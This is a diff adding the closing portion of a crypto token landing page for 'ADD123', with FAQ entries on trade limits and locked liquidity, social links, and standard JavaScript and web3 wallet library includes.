+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseSeven3" aria-expanded="false" aria-controls="collapseSix3">
+											What will be the maximum buy & sell?
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseSeven3" class="collapse" aria-labelledby="faqSeven3" data-parent="#accordionFaq">
+									<div class="card-body text-sub-primary">
+										<p class="m-b0" style="color: #000">During the first 24-hours of launch a 10% transaction limit of amount locked in the liquidity pool. (this will increase in case of demand).</p>
+									</div>
+								</div>
+							</div>
+							<div class="card">
+								<div class="card-header" id="faqEith3">
+									<h5 class="dlab-title">
+										<a href="javascript:void(0);" class="collapsed" data-toggle="collapse" data-target="#collapseEith3" aria-expanded="false" aria-controls="collapseSeven3">
+											How much liquidity will be locked on launch?
+											<span class="toggle-close"></span>
+										</a>
+									</h5>
+								</div>
+								<div id="collapseEith3" class="collapse" aria-labelledby="faqEith3" data-parent="#accordionFaq">
+									<div class="card-body text-sub-primary">
+										<p class="m-b0" style="color: #000">The initial liquidity will be 30 BNB with 900 million ADD123 (locked for 2 years).</p>
+									</div>
+								</div>
+							</div>
+							</div>
+						</div>
+					</div>
+				</div>
+		</section>
+		
+		
+<!-- Footer -->
+    <footer class="site-footer style-2" id="footer" style="background-image: url(images/background/bg4.png);  background-size: cover;">
+		<div class="container text-center">
+		<div class="footer-top">
+            <div class="container text-center">
+				<div class="row">
+					<div class="col-lg-12 wow fadeIn" data-wow-duration="2s" data-wow-delay="0.2s" >
+                        <div class="section-head style-3 text-center z mb-3">
+							<div class="footer-logo">
+								<a href="#home"><img src="images/logo-footer.png" class="move-4" alt="ADD123"/></a> 
+								</br><img src="images/titles/community.png">
+								<div class="widget widget_getintuch">
+								<ul>
+									<li><a class="fa fa-telegram" href="https://t.me/ADD123"></a></li>
+									<li><a class="fa fa-twitter" href="https://twitter.com/ADD123ADD1234"></a></li>
+								</ul>
+							</div>
+							</div>
+						</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- footer bottom part -->
+        <div class="footer-bottom">
+            <div class="container">
+                <div class="row align-items-center">
+                    <div class="col-md-12"> 
+						<span class="copyright-text">Copyright © 2021 <a href="https://ADD123coin.com" target="_blank">Soldier metaadd123</a>. All rights reserved.</span> 
+					</div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- Footer End -->
+	<button class="scroltop icon-up" type="button"><i class="fa fa-arrow-up"></i></button>
+</div>
+<!-- JAVASCRIPT FILES ========================================= -->
+<script src="js/jquery.min.js"></script><!-- JQUERY.MIN JS -->
+<script src="vendor/wow/wow.js"></script><!-- WOW JS -->
+<script src="vendor/bootstrap/js/popper.min.js"></script><!-- POPPER.MIN JS -->
+<script src="vendor/bootstrap/js/bootstrap.min.js"></script><!-- BOOTSTRAP.MIN JS -->
+<script src="vendor/owl-carousel/owl.carousel.js"></script><!-- OWL-CAROUSEL JS -->
+<script src="vendor/magnific-popup/magnific-popup.js"></script><!-- MAGNIFIC-POPUP JS -->
+<script src="vendor/counter/waypoints-min.js"></script><!-- WAYPOINTS JS -->
+<script src="vendor/counter/counterup.min.js"></script><!-- COUNTERUP JS -->
+<script src="vendor/imagesloaded/imagesloaded.js"></script><!-- IMAGESLOADED -->
+<script src="vendor/masonry/masonry-4.2.2.js"></script><!-- MASONRY -->
+<script src="vendor/masonry/isotope.pkgd.min.js"></script><!-- ISOTOPE -->
+<script src="vendor/lightgallery/js/lightgallery-all.min.js"></script><!-- LIGHTGALLERY -->
+<script src="vendor/bootstrap-select/bootstrap-select.min.js"></script><!-- BOOTSTRAP SELECT -->
+<script src="js/dz.carousel.js"></script><!-- OWL-CAROUSEL -->
+<script src="js/dz.ajax.js"></script><!-- CONTACT JS  -->
+<script type="text/javascript" src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+<script type="text/javascript" src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
+<script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+<script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.2.1/dist/umd/index.min.js"></script>
+<script type="text/javascript" src="https://unpkg.com/fortmatic@2.0.6/dist/fortmatic.js"></script>
+<script src="js/custom.js"></script><!-- CUSTOM JS -->
+
+  </body>
+</html>
